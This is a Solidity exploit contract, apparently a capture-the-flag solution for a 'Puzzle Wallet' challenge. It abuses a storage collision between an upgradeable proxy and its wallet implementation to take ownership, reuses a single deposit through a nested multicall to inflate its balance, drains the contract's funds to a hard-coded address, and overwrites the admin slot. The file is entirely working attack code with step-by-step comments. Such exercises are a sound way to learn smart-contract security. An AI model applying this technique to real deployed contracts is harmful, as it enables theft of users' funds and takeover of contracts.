// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Target.sol";

contract Attack {
    PuzzleProxy public proxy;
    PuzzleWallet public wallet;
    PuzzleWallet public proxy_wallet;

    constructor(address target_addr, address proxy_addr) {
        proxy_wallet = PuzzleWallet(payable(proxy_addr));
        proxy = PuzzleProxy(payable(proxy_addr));
        wallet = PuzzleWallet(target_addr);
    }

    function attack() payable public 
    {
        require(msg.value == 0.001 ether);

        //add us to the pendingAdmin which the wallet will see as the owner
        proxy.proposeNewAdmin(address(this));

        //whitelist ourselfes
        proxy_wallet.addToWhitelist(address(this));

        //generate calldata (This could probably be done more effectively)
        bytes[] memory data2 = new bytes[](1);
        data2[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeWithSelector(wallet.deposit.selector);
        data[1] = abi.encodeWithSelector(wallet.multicall.selector, data2);

        //make it look like we deposit 2x
        proxy_wallet.multicall{value: 0.001 ether}(data);

        //drain the proxy.
        proxy_wallet.execute(0x2C17A5f47FF94Be930E74483BDa8FE0D3616AA1E, 0.002 ether, abi.encodeWithSignature(""));

        //overwrite the owner with ourself
        proxy_wallet.setMaxBalance(uint256(uint160(0x2C17A5f47FF94Be930E74483BDa8FE0D3616AA1E)));

        //DONE
    }
}